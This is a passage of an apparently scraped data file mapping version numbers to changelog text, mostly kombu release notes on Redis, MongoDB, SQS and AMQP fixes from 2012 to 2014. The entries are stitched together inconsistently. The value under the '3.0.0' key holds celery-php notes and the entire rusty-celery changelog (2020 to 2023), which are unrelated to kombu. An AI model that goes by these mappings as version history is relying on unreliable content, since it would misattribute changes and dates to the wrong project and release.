keeps others (e.g read vs write).\n\n    Fix contributed by Roger Hu.\n\n- CouchDB: Now works without userid set.\n\n    Fix contributed by Latitia M. Haskins.\n\n- SQLAlchemy: Now supports recovery from connection errors.\n\n    Contributed by Felix Schwarz.\n\n- Redis: Restore at shutdown now works when ack emulation is disabled.\n\n- :func:`kombu.common.eventloop` accidentally swallowed socket errors.\n\n- Adds :func:`kombu.utils.url.sanitize_url`\n\n.. _version-3.0.16:\n\n", "3.0.16": "======\n:release-date: 2014-05-06 01:00 P.M UTC\n:release-by: Ask Solem\n\n- ``kombu[librabbitmq]`` now depends on librabbitmq 1.5.1.\n\n- Redis: Fixes ``TypeError`` problem in ``unregister`` (Issue 342).\n\n    Fix contributed by Tobias Schottdorf.\n\n- Tests: Some unit tests accidentally required the `redis-py` library.\n\n    Fix contributed by Randy Barlow.\n\n- librabbitmq: Would crash when using an older version of :mod:`librabbitmq`,\n  now emits warning instead.\n\n.. _version-3.0.15:\n\n", "3.0.15": "======\n:release-date: 2014-04-15 09:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.5.\n\n- RabbitMQ 3.3 changes QoS semantics (Issue 339).\n\n    See the RabbitMQ release notes here:\n    http://www.rabbitmq.com/blog/2014/04/02/breaking-things-with-rabbitmq-3-3/\n\n    A new connection property has been added that can be used to detect\n    whether the remote server is using this new QoS behavior:\n\n    .. code-block:: pycon\n\n        >>> Connection('amqp://').qos_behavior_matches_spec\n        False\n\n    so if your application depends on the old semantics you can\n    use this to set the ``apply_global`` flag appropriately:\n\n    .. code-block:: python\n\n        def update_prefetch_count(channel, new_value):\n            channel.basic_qos(\n                0, new_value,\n                not channel.connection.client.qos_behavior_matches_spec,\n            )\n\n- Users of :mod:`librabbitmq` is encouraged to upgrade to librabbitmq 1.5.0.\n\n    The ``kombu[librabbitmq]`` extra has been updated to depend on this\n    version.\n\n- Pools: Now takes transport options into account when comparing connections\n  (Issue 333).\n\n- MongoDB: Fixes Python 3 compatibility.\n\n- Async: select: Ignore socket errors when attempting to unregister handles\n  from the loop.\n\n- Pidbox: Can now be configured to use a serializer other than json,\n  but specifying a serializer argument to :class:`~kombu.pidbox.Mailbox`.\n\n    Contributed by Dmitry Malinovsky.\n\n- Message decompression now works with Python 3.\n\n    Fix contributed by Adam Gaca.\n\n.. _version-3.0.14:\n\n", "3.0.14": "======\n:release-date: 2014-03-19 07:00 P.M UTC\n:release-by: Ask Solem\n\n- **MongoDB**: Now endures a connection failover (Issue 123).\n\n    Fix contributed by Alex Koshelev.\n\n- **MongoDB**: Fixed ``KeyError`` when a replica set member is removed.\n\n    Also fixes celery971 and celery/898.\n\n    Fix contributed by Alex Koshelev.\n\n- **MongoDB**: Fixed MongoDB broadcast cursor re-initialization bug.\n\n    Fix contributed by Alex Koshelev.\n\n- **Async**: Fixed bug in lax semaphore implementation where in\n  some usage patterns the limit was not honored correctly.\n\n    Fix contributed by Ionel Cristian M\u0103rie\u0219.\n\n- **Redis**: Fixed problem with fanout when using Python 3 (Issue 324).\n\n- **Redis**: Fixed ``AttributeError`` from attempting to close a non-existing\n  connection (Issue 320).\n\n.. _version-3.0.13:\n\n", "3.0.13": "======\n:release-date: 2014-03-03 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Redis: Fixed serious race condition that could lead to data loss.\n\n    The delivery tags were accidentally set to be an incremental number\n    local to the channel, but the delivery tags need to be globally\n    unique so that a message can not overwrite an older message\n    in the backup store.\n\n    This change is not backwards incompatible and you are encouraged\n    to update all your system using a previous version as soon as possible.\n\n- Now depends on :mod:`amqp` 1.4.4.\n\n- Pidbox: Now makes sure message encoding errors are handled by default,\n  so that a custom error handler does not need to be specified.\n\n- Redis: The fanout exchange can now use AMQP patterns to route and filter\n  messages.\n\n    This change is backwards incompatible and must be enabled with\n    the ``fanout_patterns`` transport option:\n\n    .. code-block:: pycon\n\n        >>> conn = kombu.Connection('redis://', transport_options={\n        ...     'fanout_patterns': True,\n        ... })\n\n    When enabled the exchange will work like an amqp topic exchange\n    if the binding key is a pattern.\n\n    This is planned to be default behavior in the future.\n\n- Redis: Fixed ``cycle`` no such attribute error.\n\n.. _version-3.0.12:\n\n", "3.0.12": "======\n:release-date: 2014-02-09 03:50 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.3.\n\n- Fixes Python 3.4 logging incompatibility (Issue 311).\n\n- Redis: Now properly handles unknown pub/sub messages.\n\n    Fix contributed by Sam Stavinoha.\n\n- amqplib: Fixed bug where more bytes were requested from the socket\n  than necessary.\n\n    Fix contributed by Ionel Cristian M\u0103rie\u0219.\n\n.. _version-3.0.11:\n\n", "3.0.11": "======\n:release-date: 2014-02-03 05:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.2.\n\n- Now always trusts messages of type `application/data` and `application/text`\n  or which have an unspecified content type (Issue 306).\n\n- Compression errors are now handled as decode errors and will trigger\n  the ``Consumer.on_decode_error`` callback if specified.\n\n- New ``kombu.Connection.get_heartbeat_interval()`` method that can be\n  used to access the negotiated heartbeat value.\n\n- `kombu.common.oid_for` no longer uses the MAC address of the host, but\n   instead uses a process-wide UUID4 as a node id.\n\n    This avoids a call to `uuid.getnode()` at module scope.\n\n- Hub.add: Now normalizes registered fileno.\n\n    Contributed by Ionel Cristian M\u0103rie\u0219.\n\n- SQS: Fixed bug where the prefetch count limit was not respected.\n\n.. _version-3.0.10:\n\n", "3.0.10": "======\n:release-date: 2014-01-17 05:40 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.1.\n\n- ``maybe_declare`` now raises a \"recoverable connection error\" if\n  the channel is disconnected instead of a :exc:`ChannelError` so that\n  the operation can be retried.\n\n- Redis: ``Consumer.cancel()`` is now thread safe.\n\n    This fixes an issue when using gevent/eventlet and a\n    message is handled after the consumer is canceled resulting\n    in a \"message for queue without consumers\" error.\n\n- Retry operations would not always respect the interval_start\n  value when calculating the time to sleep for (Issue 303).\n\n    Fix contributed by Antoine Legrand.\n\n- Timer: Fixed \"unhashable type\" error on Python 3.\n\n- Hub: Do not attempt to unregister operations on an already closed\n  poller instance.\n\n.. _version-3.0.9:\n\n", "3.0.9": "=====\n:release-date: 2014-01-13 05:30 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.0.\n\n- Redis: Basic cancel for fanout based queues now sends a corresponding\n  ``UNSUBSCRIBE`` command to the server.\n\n    This fixes an issue with pidbox where reply messages could be received\n    after the consumer was canceled, giving the ``\"message to queue without\n    consumers\"`` error.\n\n- MongoDB: Improved connection string and options handling\n  (Issue 266 + Issue 120).\n\n    Contributed by Alex Koshelev.\n\n- SQS: Limit the number of messages when receiving in batch to 10.\n\n    This is a hard limit enforced by Amazon so the sqs transport\n    must not exceeed this value.\n\n    Fix contributed by Eric Reynolds.\n\n- ConsumerMixin: ``consume`` now checks heartbeat every time the\n  socket times out.\n\n    Contributed by Dustin J. Mitchell.\n\n- Retry Policy: A max retries of 0 did not retry forever.\n\n    Fix contributed by Antoine Legrand.\n\n- Simple: If passing a Queue object the simple utils will now take\n  default routing key from that queue.\n\n    Contributed by Fernando Jorge Mota.\n\n- ``repr(producer)`` no longer evaluates the underlying channnel.\n\n- Redis: The map of Redis error classes are now exposed at the module level\n  using the :func:`kombu.transport.redis.get_redis_error_classes` function.\n\n- Async: ``Hub.close`` now sets ``.poller`` to None.\n\n.. _version-3.0.8:\n\n", "3.0.8": "=====\n:release-date: 2013-12-16 05:00 P.M UTC\n:release-by: Ask Solem\n\n- Serializer: loads and dumps now wraps exceptions raised into\n  :exc:`~kombu.exceptions.DecodeError` and\n  :exc:`kombu.exceptions.EncodeError` respectively.\n\n    Contributed by Ionel Cristian Maries\n\n- Redis: Would attempt to read from the wrong connection if a select/epoll/kqueue\n  exception event happened.\n\n    Fix contributed by Michael Nelson.\n\n- Redis: Disabling ack emulation now works properly.\n\n    Fix contributed by Michael Nelson.\n\n- Redis: :exc:`IOError` and :exc:`OSError` are now treated as recoverable\n  connection errors.\n\n- SQS: Improved performance by reading messages in bulk.\n\n    Contributed by Matt Wise.\n\n- Connection Pool: Attempting to acquire from a closed pool will now\n  raise :class:`RuntimeError`.\n\n.. _version-3.0.7:\n\n", "3.0.7": "=====\n:release-date: 2013-12-02 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixes Python 2.6 compatibility.\n\n- Redis: Fixes 'bad file descriptor' issue.\n\n.. _version-3.0.6:\n\n", "3.0.6": "=====\n:release-date: 2013-11-21 04:50 P.M UTC\n:release-by: Ask Solem\n\n- Timer: No longer attempts to hash keyword arguments (Issue 275).\n\n- Async: Did not account for the long type for file descriptors.\n\n    Fix contributed by Fabrice Rabaute.\n\n- PyPy: kqueue support was broken.\n\n- Redis: Bad pub/sub payloads no longer crashes the consumer.\n\n- Redis: Unix socket URLs can now specify a virtual host by including\n  it as a query parameter.\n\n    Example URL specifying a virtual host using database number 3:\n\n    .. code-block:: text\n\n        redis+socket:///tmp/redis.sock?virtual_host=3\n\n- ``kombu.VERSION`` is now a named tuple.\n\n.. _version-3.0.5:\n\n", "3.0.5": "=====\n:release-date: 2013-11-15 11:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.3.3.\n\n- Redis: Fixed Python 3 compatibility problem (Issue 270).\n\n- MongoDB: Fixed problem with URL parsing when authentication used.\n\n    Fix contributed by dongweiming.\n\n- pyamqp: Fixed small issue when publishing the message and\n  the property dictionary was set to None.\n\n    Fix contributed by Victor Garcia.\n\n- Fixed problem in ``repr(LaxBoundedSemaphore)``.\n\n    Fix contributed by Antoine Legrand.\n\n- Tests now passing on Python 3.3.\n\n.. _version-3.0.4:\n\n", "3.0.4": "=====\n:release-date: 2013-11-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- common.QoS: ``decrement_eventually`` now makes sure the value\n  does not go below 1 if a prefetch count is enabled.\n\n.. _version-3.0.3:\n\n", "3.0.3": "=====\n:release-date: 2013-11-04 03:00 P.M UTC\n:release-by: Ask Solem\n\n- SQS: Properly reverted patch that caused delays between messages.\n\n    Contributed by James Saryerwinnie\n\n- select: Clear all registerd fds on poller.cloe\n\n- Eventloop: unregister if EBADF raised.\n\n.. _version-3.0.2:\n\n", "3.0.2": "=====\n:release-date: 2013-10-29 02:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` version 1.3.2.\n\n- select: Fixed problem where unregister did not properly remove\n  the fd.\n\n.. _version-3.0.1:\n\n", "3.0.1": "=====\n:release-date: 2013-10-24 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` version 1.3.1.\n\n- Redis: New option ``fanout_keyprefix``\n\n    This transport option is recommended for all users as it ensures\n    that broadcast (fanout) messages sent is only seen by the current\n    virtual host:\n\n    .. code-block:: python\n\n        Connection('redis://', transport_options={'fanout_keyprefix': True})\n\n    However, enabling this means that you cannot send or receive messages\n    from older Kombu versions so make sure all of your participants\n    are upgraded and have the transport option enabled.\n\n    This will be the default behavior in Kombu 4.0.\n\n- Distribution: Removed file ``requirements/py25.txt``.\n\n- MongoDB: Now disables ``auto_start_request``.\n\n- MongoDB: Enables ``use_greenlets`` if eventlet/gevent used.\n\n- Pidbox: Fixes problem where expires header was None,\n  which is a value not supported by the amq protocol.\n\n- ConsumerMixin: New ``consumer_context`` method for starting\n  the consumer without draining events.\n\n.. _version-3.0.0:\n\n", "3.0.0": "- **Removed support for PHP 5.3.**\n- celery-php now uses a PSR-4 compliant namespace, `Celery`. To migrate to the\n  new version, change code from `new Celery(\u2026)` to `new \\Celery\\Celery(\u2026)`.\n- Now supports php-amqplib/php-amqplib for the amqplib backend as\n  videlalvaro/php-amqplib is abandoned.\n- Fix crash with the ampqlib backend when Celery has not yet created the\n  results exchange.\n- The `Celery` constructor no longer accepts the argument\n  `persistent_messages`. It was previously unused.\n- celery-php now uses Celery task protocol version 2 and requires Celery 4.0+.\n\n\n Changelog\n\nAll notable changes to this project will be documented in this file.\n\nThe format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),\nand this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).\n\n Unreleased\n\n [v0.5.5](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.5) - 2023-09-25\n\n Fixed\n\n- Replaced unnecessary `println!` with `log::info!`.\n\n [v0.5.4](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.4) - 2023-09-11\n\n Fixed\n\n- Skip warning about redis heartbeat when not necessary.\n\n [v0.5.3](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.3) - 2023-02-28\n\n Fixed\n\n- `BrokerBuilder` is now `Send + Sync`.\n\n [v0.5.2](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.2) - 2023-02-20\n\n Changed\n\n- Store a reference to the Celery app in Request.\n\n Fixed\n\n- Fixed compilation issue on Windows.\n\n [v0.5.1](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.1) - 2023-02-16\n\n Fixed\n\n- Bumped base64 to it's latest and safest version\n- Bumped tokio to it's latest version\n- Bumped rmp-serde to it's latest version\n- Bumped serde_yaml to it's latest version\n- Bumped uuid to it's latest version\n- Bumped once_cell to it's latest version\n- Bumped redis to it's latest version\n- Bumped env_logger to it's latest version\n- Bumped mypy to it's latest version\n- Bumped black to it's latest version\n- Bumped flake8 to it's latest version\n\n [v0.5.0](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.5.0) - 2023-02-14\n\n Changed\n\n- Changed Celery type to be broker agnostic, allowing broker to be chosen dynamically at runtime.\n\n [v0.4.0](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0) - 2023-02-03\n\n Fixed\n\n- Bumped Lapin to it's latest and safest version\n- Bumped black to it's latest version, since current was breaking\n\n Added\n\n- Add explicit feature support for rustls/native-tls\n\n [v0.4.0-rcn.11](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rcn.11) - 2021-10-07\n\n Fixed\n\n- Fixed SemVer ordering.\n\n [v0.4.0-rc10](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rc10) - 2021-08-30\n\n Fixed\n\n- Fixed another bug with the `app!` and `beat!` related to issue [250](https://github.com/rusty-celery/rusty-celery/issues/250).\n\n [v0.4.0-rc8](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rc8) - 2021-08-05\n\n Changed\n\n- \u26a0\ufe0f **BREAKING CHANGE** \u26a0\ufe0f\n\n  The `RegularSchedule` in the `beat` module has been renamed to `DeltaSchedule` to\n  be more coherent with Python Celery terminology, where it is sometimes called *timedelta*.\n- Tokio updated to 1.0.0.\n- The `Broker::configure_task_routes` produces `BrokerError` instead of `CeleryError`.\n- The `beat` macro now expects a list of tasks that is used to initialize the scheduler.\n- Errors have been refactored:\n   * The `BadRoutingPattern` variant has been moved from `CeleryError` to `BrokerError`;\n   * The `CronScheduleError` has been replaced by a `ScheduleError` enum with a `CronScheduleError` variant;\n   * A `ScheduleError` variant has been added to `BeatError`\n   * A `BadRoutingPattern` error has been added.\n\n Added\n\n- \ud83d\ude80\ud83d\ude80 Redis broker support \ud83d\ude80\ud83d\ude80\n- Added the `max_sleep_duration` property on the `Beat` which can be used to ensure that\n  the scheduler backend is called regularly (which may be necessary for custom backends).\n- Added a method `Beat::schedule_named_task` to add a scheduled task with a custom name.\n- Added a method `Broker::cancel` to cancel an existing consumer.\n- Changed `Ok` variant type of the the return type of `Broker::consume`. This is now a tuple that includes a unique\n  consumer tag that can then be passed to `Broker::cancel` to cancel the corresponding consumer.\n- Added a \"coverage\" job to GitHub Actions.\n- Completed MessageBuilder struct\n\n Fixed\n\n- Fixed a bug with `AMQPBroker::close()` that would result in an error with `lapin`.\n- Fixed a bug with the `celery::app!` macro that caused it to fail to compile when the broker connection string was passed as a variable instead of an expression.\n\n [v0.4.0-rc5](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rc5) - 2020-11-19\n\n Added\n\n- Added the `CronSchedule` struct to support Celery's\n  [crontab](https://docs.celeryproject.org/en/stable/reference/celery.schedules.html#celery.schedules.crontab)\n  schedules.\n\n Changed\n\n- \u26a0\ufe0f **BREAKING CHANGE** \u26a0\ufe0f\n\n  To improve the `app!` and `beat!` macros and accommodate custom `Broker`s and `SchedulerBackend`s,\n  we've had to make breaking changes to the way these macros are invoked.\n\n  The biggest change is that the macros now return a future of `Result<Celery>` or `Result<Beat>`.\n  This means you must now call `.await?` on the return value of the macro.\n\n  The other change is that you must now supply the actual `Broker` type.\n  Previously, you could write something like `broker = AMQP { \"amqp://my-broker-url\" }`,\n  but now you have to write it like `broker = celery::broker::AMQPBroker { \"amqp://my-broker-url\" }`.\n\n  For a concrete example of these changes, the old way looked like this:\n\n\n  ```rust\n  [tokio::main]\n  async fn main() -> anyhow::Result<()> {\n      let app = celery::app!(\n          broker = AMQP { \"amqp://my-broker-url\" },\n          tasks = [add],\n          task_routes = [\"*\" => \"celery\"],\n      );\n\n      // ...\n\n      Ok(())\n  }\n  ```\n\n  Whereas now that will look like this:\n\n  ```rust\n  [tokio::main]\n  async fn main() -> anyhow::Result<()> {\n      let app = celery::app!(\n          broker = celery::broker::AMQPBroker { \"amqp://my-broker-url\" },\n          tasks = [add],\n          task_routes = [\"*\" => \"celery\"],\n      ).await?;\n\n      // ...\n\n      Ok(())\n  }\n  ```\n\n- Celery apps no longer need to have static lifetimes. To remove this constraint, we changed\n  `Celery::consume` to take `&Arc<Self>` instead of a static reference to `self`.\n- Now using `tokio-amqp` internally with `lapin`.\n- Drop explicit dependency on amq-protocol.\n\n Fixed\n\n- Task ID now logged when a beat app sends a task.\n- Fixes to docs. Added a \"Build Docs\" job to GitHub Actions.\n- Fixed a Celery beat [issue](https://github.com/rusty-celery/rusty-celery/issues/199)\n  that caused a task to be dropped if its scheduled run was delayed\n\n", "2.5.16": "======\n:release-date: 2013-10-04 03:30 P.M BST\n:release-by: Ask Solem\n\n- Python 3: Fixed problem with dependencies not being installed.\n\n.. _version-2.5.15:\n\n", "2.5.15": "======\n:release-date: 2013-10-04 03:30 P.M BST\n:release-by: Ask Solem\n\n- Declaration cache: Now only keeps hash of declaration\n  so that it does not keep a reference to the channel.\n\n- Declaration cache: Now respects ``entity.can_cache_declaration``\n  attribute.\n\n- Fixes Python 2.5 compatibility.\n\n- Fixes tests after python-msgpack changes.\n\n- ``Queue.get``: Now supports ``accept`` argument.\n\n.. _version-2.5.14:\n\n", "2.5.14": "======\n:release-date: 2013-08-23 05:00 P.M BST\n:release-by: Ask Solem\n\n- safe_str did not work properly resulting in\n  :exc:`UnicodeDecodeError` (Issue 248).\n\n.. _version-2.5.13:\n\n", "2.5.13": "======\n:release-date: 2013-08-16 04:00 P.M BST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.0.13\n\n- Fixed typo in Django functional tests.\n\n- safe_str now returns Unicode in Python 2.x\n\n    Fix contributed by Germ\u00e1n M. Bravo.\n\n- amqp: Transport options are now merged with arguments\n  supplied to the connection.\n\n- Tests no longer depends on distribute, which was deprecated\n  and merged back into setuptools.\n\n    Fix contributed by Sascha Peilicke.\n\n- ConsumerMixin now also restarts on channel related errors.\n\n    Fix contributed by Corentin Ardeois.\n\n.. _version-2.5.12:\n\n", "2.5.12": "======\n:release-date: 2013-06-28 03:30 P.M BST\n:release-by: Ask Solem\n\n- Redis: Ignore errors about keys missing in the round-robin cycle.\n\n- Fixed test suite errors on Python 3.\n\n- Fixed msgpack test failures.\n\n.. _version-2.5.11:\n\n", "2.5.11": "======\n:release-date: 2013-06-25 02:30 P.M BST\n:release-by: Ask Solem\n\n- Now depends on amqp 1.0.12 (Py3 compatibility issues).\n\n- MongoDB:  Removed cause of a \"database name in URI is being ignored\"\n  warning.\n\n    Fix by Flavio Percoco Premoli\n\n- Adds ``passive`` option to :class:`~kombu.Exchange`.\n\n    Setting this flag means that the exchange will not be declared by kombu,\n    but that it must exist already (or an exception will be raised).\n\n    Contributed by Rafal Malinowski\n\n- Connection.info() now gives the current hostname and not the list of\n  available hostnames.\n\n    Fix contributed by John Shuping.\n\n- pyamqp: Transport options are now forwarded as kwargs to ``amqp.Connection``.\n\n- librabbitmq: Transport options are now forwarded as kwargs to\n  ``librabbitmq.Connection``.\n\n- librabbitmq:  Now raises :exc:`NotImplementedError` if SSL is enabled.\n\n    The librabbitmq library does not support ssl,\n    but you can use stunnel or change to the ``pyamqp://`` transport\n    instead.\n\n    Fix contributed by Dan LaMotte.\n\n- librabbitmq: Fixed a cyclic reference at connection close.\n\n- eventio: select implementation now removes bad file descriptors.\n\n- eventio: Fixed Py3 compatibility problems.\n\n- Functional tests added for py-amqp and librabbitmq transports.\n\n- Resource.force_close_all no longer uses a mutex.\n\n- Pidbox: Now ignores `IconsistencyError` when sending replies,\n  as this error simply means that the client may no longer be alive.\n\n- Adds new :meth:`Connection.collect <~kombu.Connection.collect>` method,\n  that can be used to clean up after connections without I/O.\n\n- ``queue_bind`` is no longer called for queues bound to\n  the \"default exchange\" (Issue 209).\n\n    Contributed by Jonathan Halcrow.\n\n- The max_retries setting for retries was not respected correctly (off by one).\n\n.. _version-2.5.10:\n\n", "2.5.10": "======\n:release-date: 2013-04-11 06:10 P.M BST\n:release-by: Ask Solem\n\n", "3.0": "-----------------------------------------\n\nKombu 3 consumers will no longer accept pickle/yaml or msgpack\nby default, and you will have to explicitly enable untrusted deserializers\neither globally using :func:`kombu.enable_insecure_serializers`, or\nusing the ``accept`` argument to :class:`~kombu.Consumer`.\n\nChanges\n-------\n\n- New utility function to disable/enable untrusted serializers.\n\n      - :func:`kombu.disable_insecure_serializers`\n      - :func:`kombu.enable_insecure_serializers`.\n\n- Consumer: ``accept`` can now be used to specify a whitelist\n  of content types to accept.\n\n    If the accept whitelist is set and a message is received\n    with a content type that is not in the whitelist then a\n    :exc:`~kombu.exceptions.ContentDisallowed` exception\n    is raised.  Note that this error can be handled by the already\n    existing `on_decode_error` callback\n\n    Examples:\n\n    .. code-block:: python\n\n        Consumer(accept=['application/json'])\n        Consumer(accept=['pickle', 'json'])\n\n- Now depends on amqp 1.0.11\n\n- pidbox: Mailbox now supports the ``accept`` argument.\n\n- Redis: More friendly error for when keys are missing.\n\n- Connection URLs: The parser did not work well when there were\n  multiple '+' tokens.\n\n.. _version-2.5.9:\n\n", "2.5.9": "=====\n:release-date: 2013-04-08 05:07 P.M BST\n:release-by: Ask Solem\n\n- Pidbox: Now warns if there are multiple nodes consuming from\n  the same pidbox.\n\n- Adds :attr:`Queue.on_declared <kombu.Queue.on_declared>`\n\n    A callback to be called when the queue is declared,\n    with signature ``(name, messages, consumers)``.\n\n- Now uses fuzzy matching to suggest alternatives to typos in transport\n  names.\n\n- SQS: Adds new transport option ``queue_prefix``.\n\n    Contributed by j0hnsmith.\n\n- pyamqp: No longer overrides verify_connection.\n\n- SQS: Now specifies the ``driver_type`` and ``driver_name``\n  attributes.\n\n    Fix contributed by Mher Movsisyan.\n\n- Fixed bug with ``kombu.utils.retry_over_time`` when no errback\n  specified.\n\n\n.. _version-2.5.8:\n\n", "2.5.8": "=====\n:release-date: 2013-03-21 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.0.10 which fixes a Python 3 compatibility error.\n\n- Redis: Fixed a possible race condition (Issue 171).\n\n- Redis: Ack emulation/visibility_timeout can now be disabled\n  using a transport option.\n\n    Ack emulation adds quite a lot of overhead to ensure data is safe\n    even in the event of an unclean shutdown.  If data loss do not worry\n    you there is now an `ack_emulation` transport option you can use\n    to disable it:\n\n    .. code-block:: python\n\n        Connection('redis://', transport_options={'ack_emulation': False})\n\n- SQS: Fixed :mod:`boto` v2.7 compatibility (Issue 207).\n\n- Exchange: Should not try to re-declare default exchange (``\"\"``)\n  (Issue 209).\n\n- SQS: Long polling is now disabled by default as it was not\n  implemented correctly, resulting in long delays between receiving\n  messages (Issue 202).\n\n- Fixed Python 2.6 incompatibility depending on ``exc.errno``\n  being available.\n\n    Fix contributed by Ephemera.\n\n.. _version-2.5.7:\n\n", "2.5.7": "=====\n:release-date: 2013-03-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on amqp 1.0.9\n\n- Redis: A regression in 2.5.6 caused the redis transport to\n  ignore options set in ``transport_options``.\n\n- Redis: New ``socket_timeout`` transport option.\n\n- Redis: ``InconsistencyError`` is now regarded as a recoverable error.\n\n- Resource pools: Will no longer attempt to release resource\n  that was never acquired.\n\n- MongoDB: Now supports the ``ssl`` option.\n\n    Contributed by Sebastian Pawlus.\n\n.. _version-2.5.6:\n\n", "2.5.6": "=====\n:release-date: 2013-02-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on amqp 1.0.8 which works around a bug found on some\n  Python 2.5 installations where 2**32 overflows to 0.\n\n.. _version-2.5.5:\n\n", "2.5.5": "=====\n:release-date: 2013-02-07 05:00 P.M UTC\n:release-by: Ask Solem\n\nSQS: Now supports long polling (Issue 176).\n\n    The polling interval default has been changed to 0 and a new\n    transport option (``wait_time_seconds``) has been added.\n    This parameter specifies how long to wait for a message from\n    SQS, and defaults to 20 seconds, which is the maximum\n    value currently allowed by Amazon SQS.\n\n    Contributed by James Saryerwinnie.\n\n- SQS: Now removes unpickleable fields before restoring messages.\n\n- Consumer.__exit__ now ignores exceptions occurring while\n  canceling the consumer.\n\n- Virtual:  Routing keys can now consist of characters also used\n  in regular expressions (e.g. parens) (Issue 194).\n\n- Virtual: Fixed compression header when restoring messages.\n\n    Fix contributed by Alex Koshelev.\n\n- Virtual: ack/reject/requeue now works while using ``basic_get``.\n\n- Virtual: Message.reject is now supported by virtual transports\n  (requeue depends on individual transport support).\n\n- Fixed typo in hack used for static analyzers.\n\n    Fix contributed by Basil Mironenko.\n\n.. _version-2.5.4:\n\n", "2.5.4": "=====\n:release-date: 2012-12-10 12:35 P.M UTC\n:release-by: Ask Solem\n\n- Fixed problem with connection clone and multiple URLs (Issue 182).\n\n    Fix contributed by Dane Guempel.\n\n- zeromq: Now compatible with libzmq 3.2.x.\n\n    Fix contributed by Andrey Antukh.\n\n- Fixed Python 3 installation problem (Issue 187).\n\n.. _version-2.5.3:\n\n", "2.5.3": "=====\n:release-date: 2012-11-29 12:35 P.M UTC\n:release-by: Ask Solem\n\n- Pidbox: Fixed compatibility with Python 2.6\n\n", "2.4.10": "======\n:release-date: 2012-11-22 06:00 P.M UTC\n:release-by: Ask Solem\n\n- The previous versions connection pool changes broke Redis support so that\n  it would always connect to localhost (default setting) no matter what\n  connection parameters were provided (Issue 176).\n\n.. _version-2.4.9:\n\n", "2.4.9": "=====\n:release-date: 2012-11-21 03:00 P.M UTC\n:release-by: Ask Solem\n\n- Redis: Fixed race condition that could occur while trying to restore\n  messages (Issue 171).\n\n    Fix contributed by Ollie Walsh.\n\n- Redis: Each channel is now using a specific connection pool instance,\n  which is disconnected on connection failure.\n\n- ProducerPool: Fixed possible dead-lock in the acquire method.\n\n- ProducerPool: ``force_close_all`` no longer tries to call the non-existent\n  ``Producer._close``.\n\n- librabbitmq: Now implements ``transport.verify_connection`` so that\n  connection pools will not give back connections that are no longer working.\n\n- New and better ``repr()`` for Queue and Exchange objects.\n\n- Python 3:  Fixed problem with running the unit test suite.\n\n- Python 3: Fixed problem with JSON codec.\n\n.. _version-2.4.8:\n\n", "2.4.8": "=====\n:release-date: 2012-11-02 05:00 P.M UTC\n:release-by: Ask Solem\n\n- Redis:  Improved fair queue cycle implementation (Issue 166).\n\n    Contributed by Kevin McCarthy.\n\n- Redis: Unacked message restore limit is now unlimited by default.\n\n    Also, the limit can now be configured using the ``unacked_restore_limit``\n    transport option:\n\n    .. code-block:: python\n\n        Connection('redis://', transport_options={\n            'unacked_restore_limit': 100,\n        })\n\n        A limit of 100 means that the consumer will restore at most 100\n        messages at each pass.\n\n- Redis: Now uses a mutex to ensure only one consumer restores messages at a\n  time.\n\n    The mutex expires after 5 minutes by default, but can be configured\n    using the ``unacked_mutex_expire`` transport option.\n\n- LamportClock.adjust now returns the new clock value.\n\n- Heartbeats can now be specified in URLs.\n\n    Fix contributed by Mher Movsisyan.\n\n- Kombu can now be used with PyDev, PyCharm and other static analysis tools.\n\n- Fixes problem with msgpack on Python 3 (Issue 162).\n\n    Fix contributed by Jasper Bryant-Greene\n\n- amqplib: Fixed bug with timeouts when SSL is used in non-blocking mode.\n\n    Fix contributed by Mher Movsisyan\n\n\n.. _version-2.4.7:\n\n", "2.4.7": "=====\n:release-date: 2012-09-18 03:00 P.M BST\n:release-by: Ask Solem\n\n- Virtual: Unknown exchanges now default to 'direct' when sending a message.\n\n- MongoDB: Fixed memory leak when merging keys stored in the db (Issue 159)\n\n    Fix contributed by Michael Korbakov.\n\n- MongoDB: Better index for MongoDB transport (Issue 158).\n\n    This improvement will create a new compund index for queue and _id in order\n    to be able to use both indexed fields for getting a new message (using\n    queue field) and sorting by _id.  It'll be necessary to manually delete\n    the old index from the collection.\n\n    Improvement contributed by rmihael\n\n.. _version-2.4.6:\n\n", "2.4.6": "=====\n:release-date: 2012-09-12 03:00 P.M BST\n:release-by: Ask Solem\n\n- Adds additional compatibility dependencies:\n\n    - Python <= 2.6:\n\n        - importlib\n        - ordereddict\n\n    - Python <= 2.5\n\n        - simplejson\n\n.. _version-2.4.5:\n\n", "2.4.5": "=====\n:release-date: 2012-08-30 03:36 P.M BST\n:release-by: Ask Solem\n\n- Last version broke installtion on PyPy and Jython due\n  to test requirements clean-up.\n\n.. _version-2.4.4:\n\n", "2.4.4": "=====\n:release-date: 2012-08-29 04:00 P.M BST\n:release-by: Ask Solem\n\n- amqplib: Fixed 